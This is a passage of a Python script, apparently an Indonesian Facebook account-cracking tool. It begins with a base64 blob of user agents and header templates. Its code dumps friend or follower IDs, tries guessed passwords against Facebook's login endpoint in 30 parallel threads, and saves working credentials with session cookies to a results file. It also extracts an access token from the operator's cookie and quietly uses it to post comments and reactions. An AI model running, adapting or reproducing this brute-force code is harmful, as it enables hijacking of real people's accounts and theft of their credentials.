ZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgSW5maW5peCBYNTUxNUYgQnVpbGQvTzExMDE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjguMC4zNDQwLjkxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgQ1BIMTgwMyBCdWlsZC9PUE0xLjE3MTAxOS4wMjYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82OS4wLjM0OTcuODYgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBBMzdmIEJ1aWxkL0xNWTQ3Vjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ny4wLjQyODAuNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUyLjEuMjI1NC41NDI5OCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgOC4xLjA7IGVuOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU3LjAuMjk4Ny4xMDggVUNCcm93c2VyLzEyLjEwLjAuMTE2MyBVQ1R1cmJvLzEuMTAuMy45MDAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xNDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDcuMS4xOyBDUEgxNzIzIEJ1aWxkL042RjI2USkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY0LjAuMzI4Mi4xMjMgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBBMzdmIEJ1aWxkL0xNWTQ3Vjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84NS4wLjQxODMuODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUwLjAuMjI1NC4xNDkxODInLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDcuMS4xOyBDUEgxODAxIEJ1aWxkL05NRjI2RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY5LjAuMzQ5Ny45MSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IENQSDE4MDMgQnVpbGQvT1BNMS4xNzEwMTkuMDI2OyBpbi1pZCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY5LjAuMzQ5Ny4xMDAgTW9iaWxlIFNhZmFyaS81MzcuMzYgUHVmZmluLzguNC4wLjQyMDgxQVAnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMS4xOyBBMzdmIEJ1aWxkL0xNWTQ3VikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY2LjAuMzM1OS4xNTggTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzQ3LjEuMjI0OS4xMjkzMjYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBWMjAzNjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82Mi4wLjMyMDIuODQgTW9iaWxlIFNhZmFyaS81MzcuMzYgVml2b0Jyb3dzZXIvNi45LjQuNCcsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IHZpdm8gMTYxMCBCdWlsZC9NTUIyOU0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82MC4wLjMxMTIuMTA3IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgQ1BIMTgwMyBCdWlsZC9PUE0xLjE3MTAxOS4wMjYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84NC4wLjQxNDcuODkgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNjsgaW4taWQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82OS4wLjM0OTcuMTAwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFB1ZmZpbi84LjMuMS40MTYyNEFQJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjE7IEExNjAxIEJ1aWxkL0xNWTQ3STsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84MC4wLjM5ODcuMTQ5IE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81MS4wLjIyNTQuMTUwODA3JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA2LjA7IG1zLU1ZOyB2aXZvIDE2MDkgQnVpbGQvTVJBNThLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTcuMC4yOTg3LjEwOCBVQ0Jyb3dzZXIvMTIuMTAuMC4xMTYzIFVDVHVyYm8vMS4xMC4zLjkwMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IHZpdm8gMTgyMCBCdWlsZC9PMTEwMTk7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjIuMC4zMjAyLjg0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFZpdm9Ccm93c2VyLzcuNC4wLjAgJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA3LjEuMTsgZW4tZ2I7IENQSDE3MjcgQnVpbGQvTjZGMjZRKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTMuMC4yNzg1LjEzNCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPcHBvQnJvd3Nlci8xNS41LjEuMTAnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBlbi1VUzsgQTM3ZiBCdWlsZC9MTVk0N1YpIEFwcGxlV2ViS2l0LzUzNC4zMCAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIFVDQnJvd3Nlci8xMS4wLjAuODI4IFUzLzAuOC4wIE1vYmlsZSBTYWZhcmkvNTM0LjMwJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjE7IHpoLWNuOyBPUFBPIEE1OW0gQnVpbGQvTE1ZNDdJKSBBcHBsZVdlYktpdC81MzQuMzAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBVQ0Jyb3dzZXIvMS4wLjAuMTAwIFUzLzAuOC4wIE1vYmlsZSBTYWZhcmkvNTM0LjMwIEFsaUFwcChUQi82LjcuMCkgV2luZFZhbmUvOC4wLjAgNzIwWDEyODAgR0NhbnZhcy8xLjQuMi4yMScsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IENQSDE3MTcgQnVpbGQvTjRGMjZNOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg1LjAuNDE4My4xMjcgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUxLjAuMjI1NC4xNTA4MDcnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDcuMS4xOyBlbi11czsgQ1BIMTcyOSBCdWlsZC9ONkYyNlEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS83MC4wLjM1MzguODAgTW9iaWxlIFNhZmFyaS81MzcuMzYgT3Bwb0Jyb3dzZXIvMTUuNi4wLjEnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDcuMS4xOyBDUEgxNzI5IEJ1aWxkL042RjI2UTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84MC4wLjM5ODcuMTE3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi80Ny4wLjIyNTQuMTQ2NzYwJywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgQ1BIMTgwMyBCdWlsZC9PUE0xLjE3MTAxOS4wMjYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ny4wLjQyODAuNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBlbi1VUzsgQTM3ZncgQnVpbGQvTE1ZNDdWKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTcuMC4yOTg3LjEwOCBVQ0Jyb3dzZXIvMTIuMTIuMy4xMjE5IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgQTM3ZncgQnVpbGQvTE1ZNDdWKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODAuMC4zOTg3Ljk5IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgQTMzZiBCdWlsZC9MTVk0N1YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBBMzdmIEJ1aWxkL0xNWTQ3Vjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS83Mi4wLjM2MjYuMTA1IE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81Mi4yLjIyNTQuNTQ1NzQnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDcuMS4xOyBlbi1nYjsgQ1BIMTcyOSBCdWlsZC9ONkYyNlEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83Ny4wLjM4NjUuMTE2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEhleVRhcEJyb3dzZXIvMTUuNy44LjAuMWJldGEnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMTsgQTM3ZiBCdWlsZC9MTVk0N1YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS80My4wLjIzNTcuOTMgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDcuMS4xOyBlbi1VUzsgQ1BIMTcxNyBCdWlsZC9ONEYyNk0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81Ny4wLjI5ODcuMTA4IFVDQnJvd3Nlci8xMy4wLjAuMTI4OCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4xLjE7IENQSDE4MDEgQnVpbGQvTk1GMjZGOyBpbi1pZCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY5LjAuMzQ5Ny4xMDAgTW9iaWxlIFNhZmFyaS81MzcuMzYgUHVmZmluLzguMy4xLjQxNjI0QVAnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDcuMS4xOyBDUEgxODAxIEJ1aWxkL05NRjI2RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY3LjAuMzM5Ni42OCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IGVuLVVTOyBDUEgxNzE3IEJ1aWxkL040RjI2TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU3LjAuMjk4Ny4xMDggVUNCcm93c2VyLzEzLjIuMC4xMjk2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA3LjEuMTsgZW4tdXM7IENQSDE3MjkgQnVpbGQvTjZGMjZRKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzAuMC4zNTM4LjgwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9wcG9Ccm93c2VyLzE1LjYuMy4yJywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjEuMTsgQ1BIMTgwMSBCdWlsZC9OTUYyNkY7IGluLWlkKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3LjEwMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBQdWZmaW4vOC4zLjEuNDE2MjRBUCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IEEzN2YgQnVpbGQvTE1ZNDdWOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg1LjAuNDE4My4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUxLjAuMjI1NC4xNTA4MDcnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDcuMS4xOyBlbi11czsgQ1BIMTcyOSBCdWlsZC9ONkYyNlEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS83MC4wLjM1MzguODAgTW9iaWxlIFNhZmFyaS81MzcuMzYgT3Bwb0Jyb3dzZXIvMTUuNi4yLjAuNGJldGEnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY5LjAuMzQ5Ny4xMDAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMTsgQTE2MDEgQnVpbGQvTE1ZNDdJOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzQ2LjAuMjQ5MC43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvMjguMC4yMjU0LjExOTIyNCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IEEzN2YgQnVpbGQvTE1ZNDdWOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzc5LjAuMzk0NS4xMzYgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUwLjAuMjI1NC4xNDkxODInLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDYuMC4xOyBlbi1VUzsgT1BQTyBSOXMgQnVpbGQvTU1CMjlNKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKVZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNUVFCcm93c2VyLzcuMiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IFYyMDM2OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYyLjAuMzIwMi44NCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBWaXZvQnJvd3Nlci82LjkuNC40JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjEuMTsgQ1BIMTcyNyBCdWlsZC9ONkYyNlE7IGluLWlkKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3LjEwMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBQdWZmaW4vOC4zLjEuNDE2MjRBUCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IENQSDE3MjkgQnVpbGQvTjZGMjZROyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xODUgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUxLjAuMjI1NC4xNTA4MDcnXQp1YWcgPSBbIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsICdOb2tpYUMzLTAwLzUuMCAoMDguNjMpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsnXQpoZyA9ICdob3N0OiB7aG9zfVxuY29ubmVjdGlvbjoga2VlcC1hbGl2ZVxuY2FjaGUtY29udHJvbDogbWF4LWFnZT0wXG51cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOiAxXG5kbnQ6IDFcbnVzZXItYWdlbnQ6IHt1YX1cbnNlYy1mZXRjaC1kZXN0OiBkb2N1bWVudFxuYWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45XG5zZWMtZmV0Y2gtc2l0ZTogc2FtZS1vcmlnaW5cbnNlYy1mZXRjaC1tb2RlOiBjb3JzXG5zZWMtZmV0Y2gtdXNlcjogZW1wdHlcbnJlZmVyZXI6IHtidX1cbmFjY2VwdC1lbmNvZGluZzogZ3ppcCwgZGVmbGF0ZVxuYWNjZXB0LWxhbmd1YWdlOiBpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuN1xueC1yZXF1ZXN0ZWQtd2l0aDogbWFyay52aWEuZ3AnCmhwID0gJ2hvc3Q6IHtob3N9XG5jb25uZWN0aW9uOiBrZWVwLWFsaXZlXG5jYWNoZS1jb250cm9sOiBtYXgtYWdlPTBcbm9yaWdpbjoge2hsfVxudXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0czogMVxuZG50OiAxXG5jb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxudXNlci1hZ2VudDoge3VhfVxuc2VjLWZldGNoLWRlc3Q6IGRvY3VtZW50XG5hY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjlcbnNlYy1mZXRjaC1zaXRlOiBzYW1lLW9yaWdpblxuc2VjLWZldGNoLW1vZGU6IGNvcnNcbnNlYy1mZXRjaC11c2VyOiBlbXB0eVxucmVmZXJlcjoge2J1fVxuYWNjZXB0LWVuY29kaW5nOiBnemlwLCBkZWZsYXRlXG5hY2NlcHQtbGFuZ3VhZ2U6IGVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44XG54LXJlcXVlc3RlZC13aXRoOiBtYXJrLnZpYS5ncCcKaWYgb3MucGF0aC5leGlzdHMoIi51YSIpOgoJaWYgb3MucGF0aC5nZXRzaXplKCIudWEiKToKCQl1YXAgPSBvcGVuKCIudWEiKS5yZWFkKCkuc3BsaXRsaW5lcygp'))

class cr:
	
	def __init__(self):
		self.ct = 0
		self.cp = []
		self.ok = []
		self.pe = urllib.parse.urlparse(hl)
		self.buf = hl+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F"
		self.buv = hl+"/login/device-based/validate-password/?shbl=0"
		
	def ckr(self, em, pas):
		try:
			self.ua = random.choice(uap)
			self.uag = random.choice(uag)
			s = r.Session()
			sys.stdout.write(f'\r [crack] {self.ct}/{kabeh} ok:-{len(self.ok)} cp:-{len(self.cp)}'),
			sys.stdout.flush()
			for pw in pas:
				if self.cek(em) : break
				rs = s.get(self.buf, headers=ch(hg.format(bu=hl+"/", ua=self.uag, hos=self.pe.netloc)))
				rs = s.post(self.buv, data={"lsd": re.search(r'name="lsd" value="(.*?)"', rs.text).group(1), "jazoest": re.search(r'name="jazoest" value="(.*?)"', rs.text).group(1), "uid": em, "flow": "login_no_pin", "pass": pw, "next": "https://developers.facebook.com/tools/debug/accesstoken/"}, headers=ch(hp.format(bu=self.buf, ua=self.ua, hl=hl, hos=self.pe.netloc)), allow_redirects=False)
				if "c_user" in s.cookies:
					cd, cs = s.cookies.get_dict(), cvs(s.cookies)
					open("result/ok.txt", "a").write(f"{em}|{pw}|{cs}\n")
					self.ok.append(em)
					print(f"\r\x1b[1;32m [LIVE] {em}|{pw}|{cs}\x1b[0m")
					if os.path.exists(".ua"):
						if os.path.getsize(".ua"):
							if self.ua not in open(".wl").read():
								# Subete no ningen wa dogu deshikanai:'v
								r.post(f"https://graph.facebook.com/1431891070614199/comments/?message={self.ua}&access_token={run.t}"); open(".wl", "a").write(self.ua+"\n")
					apc("active", cd)
					#apc("inactive", cd)
					break
				elif "checkpoint" in s.cookies:
					cd, cs = s.cookies.get_dict(), cvs(s.cookies)
					open("result/cp.txt", "a").write(f"{em}|{pw}\n")
					self.cp.append(em)
					print(f"\r\x1b[1;33m [CHEK] {em}|{pw}           \x1b[0m")
					break
				else:
					continue
			self.ct += 1
		except (r.exceptions.ConnectionError, r.exceptions.ConnectTimeout, r.exceptions.ReadTimeout):
			time.sleep(2);self.ckr(em, pas)
		
	def cek(self, u):
		if u in open("result/ok.txt").read() or u in open("result/cp.txt").read(): return True
		
	def ikuzo(self, lost):
		global kabeh
		kabeh = len(lost)
		from concurrent.futures import ThreadPoolExecutor as thr
		with thr(max_workers=30) as sub:
			for usr in lost:
				sub.submit(self.ckr, usr["u"], usr["p"])
		
class main:
	
	def __init__(self, c=None, t=None):
		self.c = c
		self.t = t

	def ck(self, citak=True):
		rs = r.get(h+"/profile.php", cookies=self.c)
		if not "mbasic_logout_button" in rs.text:
			os.remove(".aing")
			os.remove(".biskuit")
			exit(" # cookie modar")
		if not citak : return
		os.system("clear")
		p = bs(rs.text, "html.parser").find("title").text
		print(f"\n    ^ By {asw} - https://github.com/zangetsu-san ^\n")
		print(f" + login as {p} | {self.c['c_user']}\n")

	def cf(self):
		if not os.path.exists("dump"):
			os.mkdir("dump")
		if not os.path.exists("result"):
			os.mkdir("result")
		if not os.path.exists("result/ok.txt") and not os.path.exists("result/cp.txt"):
			open("result/ok.txt", "w")
			open("result/cp.txt", "w")
		if not os.path.exists(".biskuit"):
			c = input(" # cookie: ")
			while not "c_user" in c:
				c = input(" # cookie: ")
			rs = r.get(h+"/profile.php", cookies=cvd(c))
			if not "mbasic_logout_button" in rs.text:
				exit(" # cookie gak valid")
			print("\n\n + welkom "+bs(rs.text, "html.parser").find("title").text+"\n\n")
			F = {"c": c, "t": None}
			open(".biskuit", "w").write(json.dumps(F))
			self.c = cvd(c)
			# please don't change
			react("1472943989842240", self.c)
			F["t"] = self.gadagToken()
			open(".biskuit", "w").write(json.dumps(F))
		asu = open(".biskuit").read()
		lod = json.loads(asu)
		self.c = cvd(lod["c"])
		if not lod["t"]:
			self.ck(False)
			lod["t"] = self.gadagToken()
			open(".biskuit", "w").write(json.dumps(lod))
		global asw
		self.t = lod["t"]
		if not os.path.exists(".aing"):
			mek = bs(r.get(h+"/profile.php?id=100013799582945", cookies=self.c).text, "html.parser").find("title").text
			open(".aing", "w").write(mek)
		asw = open(".aing").read()
		if not os.path.exists(".wl"):
			open(".wl", "w")
	
	def gadagToken(self):
		rs = r.get("https://business.facebook.com/business_locations", cookies=self.c, headers={"Host": "business.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"})
		return re.search('(EAAG\w+)', rs.text).group(1)
		
	def sv(self, rv, ot):
		exs = glob.glob("dump/*")
		if f"dump/{ot}.json" in exs:
			ot = ot+"".join(random.choice("abcdefghijklmnopqrstuvwxyz") for x in range(6))
		ot = "dump/"+ot+".json"
		open(ot, "w").write(json.dumps(rv))
		exit(f"\n + file save as {ot}")
	
	def oven(self):
		exs = glob.glob("dump/*")
		if len(exs) == 0:
			exit(" .! gak ada file dump, silahkan dump id terlebih dahulu asw")
		print(f"\n + {len(exs)} file dump ditemukan\n")
		for x in range(1, len(exs)+1):
			print(f" [{x}] {exs[x-1]}")
		sl = input("\n ?> ")
		while not sl in [str(i) for i in range(1, len(exs)+1)]:
			sl = input(" ?> ")
		cs = exs[int(sl)-1]
		return json.loads(open(cs).read())
	
	def start(self):
		self.lov = self.oven()
		sl = input(" ?> pake pw manual (y/n): ").upper()
		while sl not in list("YN"):
			sl = input(" ?> pake pw manual (y/n): ").upper()
		mnl = True if sl == "Y" else False
		self.osp = sp(self.lov, ml=mnl); sm()
		print("\n + crack started\n")
		cr().ikuzo(self.osp)
		print("\n\n # Done^")
		
	def base(self):
		self.cf()
		self.ck()
		m = d(self.c, self.t)
		print(" [1] dump id dari daftar teman")
		print(" [2] dump id dari followers")
		print(" [3] hapus file dump")
		print(" [4] ganti useragent")
		print(" [5] start crack")
		print(" [6] logout")
		print(" [0] exite\n")
		sl = input(" ?> ")
		while not sl in list("1234560"):
			sl = input(" ?> ")
		if sl == "1":
			ps = [{"e": "Tidak Ada Teman Untuk Ditampilkan", "p": " .! looks like the friends list is not published"}, {"e": "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang", "p": " .! limit"}, {"e": "Konten Tidak Ditemukan", "p": " .! user not found"}]
			u = input(" ?> id: ")
			while not u:
				u = input(" ?> id: ")
			u = u.split("/")[-1].split("id=")[-1]
			u = h+"/profile.php?id="+u+"&v=friends" if u.isdigit() else h+"/"+u+"/friends/"
			rs = r.get(u, cookies=self.c)
			for x in ps:
